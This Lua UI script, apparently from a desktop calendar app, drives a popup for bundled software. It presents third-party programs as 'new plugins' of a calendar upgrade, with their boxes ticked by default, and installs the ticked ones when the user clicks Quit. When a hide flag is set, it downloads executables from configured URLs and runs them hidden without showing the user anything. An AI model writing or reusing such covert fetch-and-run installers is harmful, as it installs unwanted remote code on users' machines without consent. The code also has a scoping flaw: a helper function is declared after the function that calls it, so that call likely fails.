local tFunHelper = XLGetGlobal("DiDa.FunctionHelper")
local tipUtil = tFunHelper.tipUtil
local tipAsynUtil = tFunHelper.tipAsynUtil
local Helper = XLGetGlobal("Helper")

local tBind = nil
local tBindSoftware = {}

function OnCreate(self)
	local objtree = self:GetBindUIObjectTree()
	local objRootLayout = objtree:GetUIObject("root.layout")
    local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	
	local nLayoutL, nLayoutT, nLayoutR, nLayoutB = objRootLayout:GetObjPos()
	local nLayoutWidth = nLayoutR - nLayoutL
	local nLayoutHeight = nLayoutB - nLayoutT
	
	local workleft, worktop, workright, workbottom = tipUtil:GetWorkArea()
	self:Move( workright - nLayoutWidth - 7, workbottom - nLayoutHeight-5, nLayoutWidth, nLayoutHeight)
	
	tBind = self:GetUserData()
	
	if tBind and tBind.Software and #tBind.Software > 0 then
	-- XLMessageBox("CreateModelessWnd tBind.bHide:"..tostring(tBind.bHide))
		for key, value in ipairs(tBind.Software) do
			if #tBindSoftware > 1 then break end
			
			local exePath = tFunHelper.RegQueryValue(value.reg)
			if not IsRealString(exePath) or not tipUtil:QueryFileExists(exePath) then
				Helper:LOG("tBind.Software name: "..tostring(value.name).." not install")
				local tmp = {}
				tmp.url = value.url
				tmp.cmd = value.cmd
				tmp.name = value.name
				tmp.check = true
				table.insert(tBindSoftware, tmp)
			else
				Helper:LOG("tBind.Software name: "..tostring(value.name).." has been installed")
			end
		end
	end
	
	if #tBindSoftware > 0 and not tBind.bHide then
		local updateText = objtree:GetUIObject("TipBindWnd.Update.Text")
		local softwareACheckbox = objtree:GetUIObject("TipBindWnd.BindSoftwareA.Checkbox")
		local softwareBCheckbox = objtree:GetUIObject("TipBindWnd.BindSoftwareB.Checkbox")
		local softwareAText = objtree:GetUIObject("TipBindWnd.BindSoftwareA.Name")
		local softwareBText = objtree:GetUIObject("TipBindWnd.BindSoftwareB.Name")
		updateText:SetText("您的电脑日历已升级成功,新增功能插件:")
		softwareACheckbox:SetVisible(true)
		softwareAText:SetText(tBindSoftware[1].name)
		softwareAText:SetVisible(true)
		
		if tBindSoftware[2] then
			softwareBCheckbox:SetVisible(true)
			softwareBText:SetText(tBindSoftware[2].name)
			softwareBText:SetVisible(true)
		end
	elseif #tBindSoftware > 0 and tBind.bHide then
		--销毁窗口
		Helper:DestoryModelessWnd("TipBindWnd")
		
		--直接无界面下载,拉起安装
		for key, value in ipairs(tBindSoftware) do
			DownloadAndInstall(value.url, value.cmd, value.name)
		end
		
	end
end

function OnShowWindow(self, bVisible)
	if not bVisible then
		return
	end
	-- local objTree = self:GetBindUIObjectTree()
	-- local objHostWnd = objTree:GetBindHostWnd()
	-- if objHostWnd then
		-- objHostWnd:SetTitle("我的在线升级")
	-- end
end

function OnClickCloseBtn(self)
	-- local objTree = self:GetOwner()
	-- local objHostWnd = objTree:GetBindHostWnd()
	-- objHostWnd:Show(0)
	
	--销毁窗口
	Helper:DestoryModelessWnd("TipBindWnd")
end

function OnClickMinBtn(self)
	local objTree = self:GetOwner()
	local objHostWnd = objTree:GetBindHostWnd()
	objHostWnd:Min()
end

function OnClickA(self)
	if not tBindSoftware or not tBindSoftware[1] then
		return
	end
	if tBindSoftware[1].check then
		tBindSoftware[1].check = false
		self:SetTextureID("TipBindWnd.checkbox.uncheck")
	else
		tBindSoftware[1].check = true
		self:SetTextureID("TipBindWnd.checkbox.check")
	end
end

function OnClickB(self)
	if not tBindSoftware or not tBindSoftware[2] then
		return
	end
	if tBindSoftware[2].check then
		tBindSoftware[2].check = false
		self:SetTextureID("TipBindWnd.checkbox.uncheck")
	else
		tBindSoftware[2].check = true
		self:SetTextureID("TipBindWnd.checkbox.check")
	end
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end

local function DownloadAndInstall(url, cmd, name)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strFileName = string.match(url, "/([^/]+exe)")
	if not IsRealString(strFileName) then
		strFileName = name
	end
	local strSavePath = tipUtil:PathCombine(strSaveDir, strFileName)
	local strStamp = tFunHelper.GetTimeStamp()
	local strURLFix = url..strStamp
	
	tFunHelper.NewAsynGetHttpFile(strURLFix, strSavePath, false
	, function(bRet, strRealPath)
			tFunHelper.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
					.." strRealPath:"..tostring(strRealPath).." exeName: "..tostring(name))
					
			if 0 ~= bRet then return end
			
			tipUtil:ShellExecute(0, "open", strRealPath, cmd, 0, "SW_HIDE")
	end)
end

function OnClickQuit(self)
	--销毁窗口
	Helper:DestoryModelessWnd("TipBindWnd")
	
	if tBindSoftware and #tBindSoftware > 0 then
		for key, value in ipairs(tBindSoftware) do
			if value.check then
				DownloadAndInstall(value.url, value.cmd, value.name)
			end
		end
	end
end

function OnClickCancle(self)
	--销毁窗口
	Helper:DestoryModelessWnd("TipBindWnd")
end

